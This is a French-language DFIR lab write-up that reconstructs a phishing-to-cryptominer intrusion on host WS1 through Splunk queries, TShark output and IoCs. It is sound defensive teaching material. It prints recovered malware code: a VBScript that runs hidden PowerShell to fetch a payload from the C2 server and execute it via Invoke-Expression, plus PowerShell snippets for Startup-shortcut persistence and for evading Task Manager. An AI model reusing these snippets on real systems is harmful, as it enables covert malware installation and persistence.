---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Complons : investigation DFIR d'une chaîne de cryptomining (Phishing → PowerShell → Mineur)"
date: 2026-10-13
categories: [DFIR]
tags: [dfir, splunk, wireshark, tshark, powershell, vbscript, cryptomining, mitre-attck, t1566, persistence, c2, ctf]
---

# Lab Complons : investigation d'une chaîne de compromission cryptomining

> **Machine compromise :** WS1 (`10.8.0.101`)
> **Index Splunk :** `complons`
> **Capture réseau :** `C:\Program Files\Wireshark\capture.pcap`
> **Objectif :** reconstituer l'accès initial, la chaîne PowerShell/VBScript, le téléchargement du mineur, la persistance et les communications C2

## Synthèse

La machine compromise est **WS1**. L'accès initial repose sur une technique de phishing, classée **T1566** par MITRE ATT&CK. Un objet HTTP servi sous l'URI `/microsoftupdate` déclenche un VBScript nommé `microsoftupdate.vbs`. Ce script lance PowerShell en fenêtre cachée et télécharge `sysupdate.txt`.

Après déobfuscation, `sysupdate.txt` télécharge `statement.zip` et `monitor`, installe le mineur `complons.exe`, dépose `monitor_9917.ps1`, puis crée un raccourci dans le dossier Startup. Le script de monitoring envoie périodiquement l'état du mineur vers `http://172.16.92.216:8080/connect.php`.

### Tableau de réponses synthétiques

| # | Réponse | Preuve principale |
| --- | --- | --- |
| Q1 | `WS1` | Commande RDP `hostname` |
| Q2 | T1566 — Phishing | Méthode d'ingénierie sociale et classification MITRE |
| Q3 | `172.16.92.216` | PCAP, journaux PowerShell et endpoint C2 |
| Q4 | `microsoftupdate.vbs` | Objet HTTP initial `/microsoftupdate`, VBScript extrait |
| Q5 | `C:\Users\Administrator\AppData\Local\Temp\microsoftupdate.vbs` *(candidat à confirmer)* | Fichier supprimé, événement `-OutFile` non retrouvé |
| Q6 | `aHR0cDovLzE3Mi4xNi45Mi4yMTYvc3lzdXBkYXRlLnR4dA==` | VBScript initial |
| Q7 | `sysupdate.txt` | Décodage Base64 de Q6 |
| Q8 | B — Inversion de chaîne + encodage Base64 | Code de déobfuscation dans `sysupdate.txt` |
| Q9 | `http://172.16.92.216/statement.zip` | Variable `$UrlArchive` |
| Q10 | `monitor_9917.ps1` | Variable `$MonitorPath` |
| Q11 | `0F06E819C6613E392057989657A03F4507FED757F719F071032D72891553C467` | `Get-FileHash -Algorithm SHA256` |
| Q12 | `Systemcachefiles` et `MyApp` | Création sous `%LOCALAPPDATA%` |
| Q13 | C — Raccourci dans le dossier Startup | Création de `monitor_9917.lnk` |
| Q14 | `monitor_9917.lnk` | Variable `$StartupPath` |
| Q15 | `complons.exe` | Variables `$ProcessName` / `$ProcessPath` |
| Q16 | C — Gestionnaire des tâches (Task Manager) | Vérification du processus `taskmgr` |
| Q17 | `IsTaskManagerRunning` | Fonction PowerShell correspondante |
| Q18 | `http://172.16.92.216:8080/connect.php` | URL et port C2 dans le script |
| Q19 | A — Utilisation CPU et état du mineur | Champs du premier rapport envoyé |

> ⚠️ **Point d'incertitude (Q5) :** le chemin proposé est le candidat le plus probable à partir du comportement de téléchargement temporaire, mais il n'a pas été confirmé par une ligne historique contenant explicitement `-OutFile`. Toutes les autres réponses disposent d'une preuve directe dans les sorties fournies ou dans le code déobfusqué.

## 1. Matériel et sources de collecte

L'enquête s'est appuyée sur trois sources complémentaires :

| Source | Apport |
| --- | --- |
| Journaux Splunk (index `complons`) | Identification des sources Windows, événements PowerShell |
| Session RDP | Hostname, répertoires, hash local |
| Wireshark / TShark | Reconstitution des requêtes HTTP et chronologie réseau |

### 1.1 Connexion RDP et identification de la machine

```powershell
hostname
```

```text
WS1
```

Vérification des connexions établies, confirmant l'accès RDP :

```powershell
Get-NetTCPConnection -State Established |
  Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess |
  Format-Table -Auto
```

```text
LocalAddress  LocalPort RemoteAddress  RemotePort OwningProcess
------------  --------- -------------  ---------- -------------
10.8.0.101    3389      10.8.0.3       53192      284
```

### 1.2 Sources Splunk pertinentes

| Host | Source | Sourcetype | Count |
| ---  | --- | --- | --- |
| 'ip-176-16-129-6' | `/opt/splunk/logs/windows_security.log` | `WinEventLog:Security` | 9679 |
| 'ip-176-16-129-6' | `/opt/splunk/logs/windows_powershell_ops.log` | `WinEventLog:Microsoft-Windows-PowerShell/Operational` | 6096 |
| 'ip-176-16-129-6' | `/opt/splunk/logs/windows_powershell.log` | `WinEventLog:Windows-PowerShell` | 5438 |
| 'ip-176-16-129-6' | `/opt/splunk/logs/windows_system.log` | `WinEventLog:System` | 63 |
| 'ip-176-16-129-6' | `/opt/splunk/logs/windows_application.log` | `WinEventLog:Application` | 23 |

La majorité des éléments utiles se trouvent dans `windows_powershell_ops.log`, `windows_powershell.log` et `windows_security.log`.

```splunk
index=complons | stats count by host source sourcetype | sort -count
```

## 2. Chronologie de la compromission

Dans la capture, l'adresse source observée pour la Workstation est `172.16.237.156` (endpoint compromis au niveau PCAP), tandis que le RDP du lab expose la machine sous `10.8.0.101`.

| Heure | Requête | Interprétation |
| --- | --- | --- |
| 14:19:54 | `GET /` vers `172.16.92.216` | Visite initiale de l'infrastructure web |
| 14:19:55 | `GET /favicon.ico` | Ressource de la page web |
| 14:20:29 | `GET /microsoftupdate` (User-Agent PowerShell) | Téléchargement du premier VBScript |
| 14:20:30 | `GET /sysupdate.txt` (User-Agent PowerShell) | Téléchargement du stager PowerShell |
| 14:20:30 | `GET /statement.zip` (User-Agent PowerShell) | Téléchargement de l'archive du mineur |
| 14:20:32 | `GET /monitor` (User-Agent PowerShell) | Téléchargement de `monitor_9917.ps1` |
| 14:20:39 | `POST /connect.php` vers le port 8080 | Premier rapport au C2 |
| 14:28:28 | `GET /latest/meta-data/iam/security-credentials/` | Tentative d'accès aux métadonnées IAM |

Commande TShark utilisée pour reconstituer les requêtes :

```powershell
cd 'C:\Program Files\Wireshark'
.\tshark.exe -r 'C:\Program Files\Wireshark\capture.pcap' `
  -Y 'http.request' -T fields `
  -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri
```

Sortie essentielle :

```text
2026-01-15T14:20:29.408285000+0000  172.16.237.156  172.16.92.216  172.16.92.216  /microsoftupdate
2026-01-15T14:20:30.004127000+0000  172.16.237.156  172.16.92.216  172.16.92.216  /sysupdate.txt
2026-01-15T14:20:30.971151000+0000  172.16.237.156  172.16.92.216  172.16.92.216  /statement.zip
2026-01-15T14:20:32.104883000+0000  172.16.237.156  172.16.92.216  172.16.92.216  /monitor
2026-01-15T14:20:39.578103000+0000  172.16.237.156  172.16.92.216:8080  172.16.92.216  /connect.php
```

Le User-Agent confirme l'origine PowerShell :

```text
Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.4294
```

## 3. Analyse détaillée

### Q1 — Hostname de la machine compromise

**Réponse :** `WS1`

```powershell
hostname
```

```text
WS1
```

Valeur confirmée dans le transcript PowerShell :

```text
Machine: WS1 (Microsoft Windows NT 10.0.20348.0)
Username: WS1\Administrator
```

### Q2 — Technique MITRE ATT&CK d'ingénierie sociale

**Réponse :** T1566 — Phishing

Le scénario décrit une compromission par ingénierie sociale conduisant l'utilisateur à exécuter ou télécharger un fichier initial.

### Q3 — Adresse IP du serveur C2

**Réponse :** `172.16.92.216`

L'adresse apparaît comme destination de toutes les requêtes de téléchargement et comme serveur recevant ensuite les communications de la chaîne malveillante (port 8080 pour l'endpoint de rapport).

```powershell
.\tshark.exe -r 'C:\Program Files\Wireshark\capture.pcap' `
  -Y 'http.request' -T fields `
  -e ip.src -e ip.dst -e http.request.uri
```

### Q4 — Nom du fichier téléchargé par la commande PowerShell initiale

**Réponse :** `microsoftupdate.vbs`

Dans le PCAP, l'URI est `/microsoftupdate` et le type est `application/octet-stream`. L'objet exporté contient :

```vbscript
Option Explicit
Dim a
Set a = CreateObject("WScript.Shell")

Dim encodedCmd
encodedCmd = "PowerShell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""& { " & _
    "$L = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE3Mi4xNi45Mi4yMTYvc3lzdXBkYXRlLnR4dA==')); " & _
    "$content = (Invoke-WebRequest -Uri $L -UseBasicParsing).Content; " & _
    "Invoke-Expression $content }"""

a.Run encodedCmd, 0, False
```

L'extension `.vbs` est cohérente avec le contenu VBScript.

### Q5 — Chemin complet du VBScript

**Réponse soumise :**

```text
C:\Users\Administrator\AppData\Local\Temp\microsoftupdate.vbs
```

> ⚠️ **Niveau de confiance : moyen.** Le fichier a été supprimé de la machine et les journaux historiques fournis ne contiennent pas la ligne `-OutFile` originale.

Méthode de validation idéale, côté Splunk :

```splunk
index=complons ("microsoftupdate.vbs" OR "wscript" OR "cscript" OR "OutFile")
| table _time host source sourcetype EventCode _raw
| sort 0 _time
```

Ou côté machine :

```powershell
Get-WinEvent -LogName Security |
  Where-Object {$_.Id -eq 4688 -and $_.Message -match 'microsoftupdate|wscript|cscript'} |
  Select-Object TimeCreated,Message | Format-List
```

### Q6 — URL encodée en Base64 dans le VBScript

**Réponse :**

```text
aHR0cDovLzE3Mi4xNi45Mi4yMTYvc3lzdXBkYXRlLnR4dA==
```

Décodage :

```powershell
[Text.Encoding]::UTF8.GetString(
  [Convert]::FromBase64String('aHR0cDovLzE3Mi4xNi45Mi4yMTYvc3lzdXBkYXRlLnR4dA==')
)
```

```text
http://172.16.92.216/sysupdate.txt
```

### Q7 — Fichier téléchargé après décodage de l'URL

**Réponse :** `sysupdate.txt` (l'URL décodée en Q6 se termine par `/sysupdate.txt`).

### Q8 — Techniques d'obfuscation

**Réponse :** B — Inversion de chaîne (string reversal) et encodage Base64

```powershell
$best64code = '...'
$base64 = $best64code.ToCharArray()
[array]::Reverse($base64)
$Stripped = -join $base64
$LoadCode = [System.Text.Encoding]::UTF8.GetString(
  [System.Convert]::FromBase64String($Padded)
)
```

### Q9 — URL de l'archive du mineur

**Réponse :**

```text
http://172.16.92.216/statement.zip
```

Après déobfuscation, `sysupdate.txt` contient :

```powershell
$UrlArchive = "http://172.16.92.216/statement.zip"
Invoke-WebRequest -Uri $UrlArchive -OutFile $TempZipPath -UseBasicParsing
```

### Q10 — Nom du script PowerShell téléchargé

**Réponse :** `monitor_9917.ps1`

```powershell
$MonitorPath = Join-Path $CustomTempDir -ChildPath "monitor_9917.ps1"
Invoke-WebRequest -Uri $UrlMonitor -OutFile $MonitorPath -UseBasicParsing
```

Chemin final observé sur la machine :

```text
C:\Users\Administrator\AppData\Local\Systemcachefiles\monitor_9917.ps1
```

### Q11 — SHA-256 du script

**Réponse :**

```text
0F06E819C6613E392057989657A03F4507FED757F719F071032D72891553C467
```

```powershell
Get-FileHash 'C:\Users\Administrator\AppData\Local\Systemcachefiles\monitor_9917.ps1' -Algorithm SHA256
```

```text
Algorithm  Hash
---------  ----
SHA256     0F06E819C6613E392057989657A03F4507FED757F719F071032D72891553C467
```

### Q12 — Répertoires créés sous %LOCALAPPDATA%

**Réponse :** `Systemcachefiles` et `MyApp`

```powershell
$CustomTempDir = Join-Path $env:LOCALAPPDATA -ChildPath "Systemcachefiles"
$MyAppData = Join-Path $env:LOCALAPPDATA -ChildPath "MyApp"

if (-not (Test-Path $CustomTempDir)) {
    New-Item -ItemType Directory -Path $CustomTempDir -Force | Out-Null
}
if (-not (Test-Path $MyAppData)) {
    New-Item -ItemType Directory -Path $MyAppData -Force | Out-Null
}
```

Vérification :

```powershell
Get-ChildItem $env:LOCALAPPDATA -Directory -Force | Select-Object Name,FullName
Test-Path "$env:LOCALAPPDATA\Systemcachefiles"
Test-Path "$env:LOCALAPPDATA\MyApp"
```

```text
MyApp                    C:\Users\Administrator\AppData\Local\MyApp
Systemcachefiles         C:\Users\Administrator\AppData\Local\Systemcachefiles
True
True
```

### Q13 — Mécanisme de persistance

**Réponse :** C — Raccourci dans le dossier Startup de Windows

```powershell
$StartupPath = Join-Path $env:APPDATA `
  -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\monitor_9917.lnk"

$ScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $ScriptShell.CreateShortcut($StartupPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MonitorPath`""
$Shortcut.Save()
```

### Q14 — Nom exact du raccourci

**Réponse :** `monitor_9917.lnk` (visible dans la valeur de `$StartupPath`).

### Q15 — Nom de l'exécutable de minage

**Réponse :** `complons.exe`

```powershell
$ProcessName = "complons"
$ProcessPath = "$env:LOCALAPPDATA\MyApp\$ProcessName.exe"
```

Vérification RDP :

```powershell
Get-ChildItem "$env:LOCALAPPDATA\MyApp" -Force
```

```text
Directory: C:\Users\Administrator\AppData\Local\MyApp

Length    Name
------    ----
2904207   complons.exe
```

### Q16 — Application surveillée pour éviter la détection

**Réponse :** C — Gestionnaire des tâches (Task Manager)

Le script recherche le processus `taskmgr` toutes les dix secondes. Si le Gestionnaire des tâches est ouvert, il arrête le mineur au lieu de le laisser visible.

```powershell
$taskMgr = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
return $taskMgr -ne $null
```

### Q17 — Fonction responsable de cette vérification

**Réponse :** `IsTaskManagerRunning`

```powershell
function IsTaskManagerRunning {
    try {
        $taskMgr = Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue
        return $taskMgr -ne $null
    } catch {
        return $false
    }
}
```

Appelée ensuite par `ManageMiner` :

```powershell
$IsTaskManagerRunning = IsTaskManagerRunning
```

### Q18 — URL et port des rapports C2

**Réponse :**

```text
http://172.16.92.216:8080/connect.php
```

Requête correspondante dans le PCAP :

```http
POST /connect.php HTTP/1.1
Host: 172.16.92.216:8080
Content-Type: application/json
```

Les événements PowerShell montrent également `Invoke-RestMethod` à intervalles réguliers vers cet endpoint.

### Q19 — Première information envoyée dans le rapport

**Réponse :** A — Utilisation CPU et état du mineur

```powershell
$cpu_usage = Get-CpuUsage
$miner_stats = Get-MinerStats
```

Corps JSON envoyé :

```powershell
@{
    cpu_usage = $cpu_usage
    miner_running = $miner_stats.Running
    total_hashes = $miner_stats.Hashes
    shares_found = $miner_stats.Shares
} | ConvertTo-Json
```

## 4. Chaîne d'exécution complète

```text
Phishing / ingénierie sociale
        |
        v
PowerShell initial
        |
        +--> GET /microsoftupdate
        |       microsoftupdate.vbs
        |       lance PowerShell caché
        |
        +--> GET /sysupdate.txt
                déobfuscation : inversion + Base64
                |
                +--> GET /statement.zip
                |       sauvegarde locale temporaire : package.zip
                |       extraction vers %LOCALAPPDATA%\MyApp
                |       dépôt de complons.exe
                |
                +--> GET /monitor
                        sauvegarde : monitor_9917.ps1
                        chemin : %LOCALAPPDATA%\Systemcachefiles
                        |
                        +--> création de monitor_9917.lnk
                        |       %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
                        |
                        +--> lancement caché de PowerShell
                                vérification de taskmgr
                                lancement/arrêt conditionnel de complons.exe
                                rapports JSON vers 172.16.92.216:8080/connect.php
```

## 5. Indicateurs de compromission (IoC)

| Type | Indicateur |
| --- | --- |
| Hostname | `WS1` |
| C2 | `172.16.92.216` |
| C2 endpoint | `http://172.16.92.216:8080/connect.php` |
| Stager | `sysupdate.txt` |
| VBScript | `microsoftupdate.vbs` |
| Script PowerShell | `monitor_9917.ps1` |
| Raccourci de persistance | `monitor_9917.lnk` |
| Mineur | `complons.exe` |
| Répertoire de script | `%LOCALAPPDATA%\Systemcachefiles` |
| Répertoire du mineur | `%LOCALAPPDATA%\MyApp` |
| Hash SHA-256 du script | `0F06E819C6613E392057989657A03F4507FED757F719F071032D72891553C467` |
| URL stager | `http://172.16.92.216/sysupdate.txt` |
| URL archive | `http://172.16.92.216/statement.zip` |
| URI initiale | `/microsoftupdate` |
| URI monitor | `/monitor` |
| URI de rapport | `/connect.php` |

## 6. Requêtes utiles pour refaire l'enquête

### 6.1 Lister les sources Splunk

```splunk
index=complons | stats count by host source sourcetype | sort -count
```

### 6.2 Rechercher les communications et URLs

```splunk
index=complons host="ip-176-16-129-6"
("172.16.92.216" OR "connect.php" OR "statement.zip" OR "sysupdate.txt" OR "monitor")
| table _time source EventCode _raw
| sort 0 _time
```

### 6.3 Rechercher les commandes PowerShell de téléchargement

```splunk
index=complons host="ip-176-16-129-6"
("Invoke-WebRequest" OR "DownloadString" OR "DownloadFile" OR "OutFile" OR "WebClient")
| table _time source EventCode Message ScriptBlockText _raw
| sort 0 _time
```

### 6.4 Rechercher la persistance

```splunk
index=complons host="ip-176-16-129-6"
("Startup" OR "monitor_9917.lnk" OR "CreateShortcut" OR "WScript.Shell")
| table _time source EventCode _raw
| sort 0 _time
```

### 6.5 Extraire les objets HTTP depuis le PCAP

```powershell
New-Item -ItemType Directory 'C:\Temp\pcap_objects' -Force | Out-Null
& 'C:\Program Files\Wireshark\tshark.exe' `
  -r 'C:\Program Files\Wireshark\capture.pcap' `
  --export-objects 'http,C:\Temp\pcap_objects'

Get-ChildItem 'C:\Temp\pcap_objects' |
  Select-Object Name,Length
```

Les objets importants observés étaient `microsoftupdate`, `sysupdate.txt`, `statement.zip`, `monitor` et `connect.php`.

### 6.6 Calculer un hash local

```powershell
Get-FileHash `
  'C:\Users\Administrator\AppData\Local\Systemcachefiles\monitor_9917.ps1' `
  -Algorithm SHA256
```

### 6.7 Vérifier les répertoires et la persistance

```powershell
Test-Path "$env:LOCALAPPDATA\Systemcachefiles"
Test-Path "$env:LOCALAPPDATA\MyApp"

Get-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\monitor_9917.lnk"
```

## 7. Conclusion analytique

L'incident est une compromission en plusieurs étapes orientée vers le cryptominage non autorisé. L'attaquant utilise d'abord une méthode d'ingénierie sociale, puis un VBScript discret qui lance PowerShell sans fenêtre visible. Le stager `sysupdate.txt` est doublement obfusqué par inversion de chaînes et Base64. Il télécharge une archive de mineur et un script de supervision, installe le binaire sous un répertoire peu visible de `%LOCALAPPDATA%`, puis crée un raccourci dans le dossier Startup pour assurer la persistance.

Le script de supervision limite l'exposition du mineur en surveillant le Gestionnaire des tâches : il lance le mineur seulement lorsque `taskmgr` n'est pas détecté et dispose d'une connexion réseau. Les rapports envoyés au C2 contiennent l'utilisation CPU, l'état du mineur, le nombre de hashes et le nombre de shares.

> ⚠️ **Point notable :** la capture montre également une tentative ultérieure d'accès aux métadonnées IAM à l'adresse `169.254.169.254`, ce qui élargit l'impact potentiel au-delà du simple cryptominage.

## Références

- Technique MITRE ATT&CK **T1566** — Phishing
- Sources primaires : sorties RDP, événements Splunk (index `complons`), transcript PowerShell `PowerShell_transcript.WS1.iMXCpWwO.20260115142037.txt`, script `sysupdate.txt`, script `monitor_9917.ps1`, capture `capture.pcap`
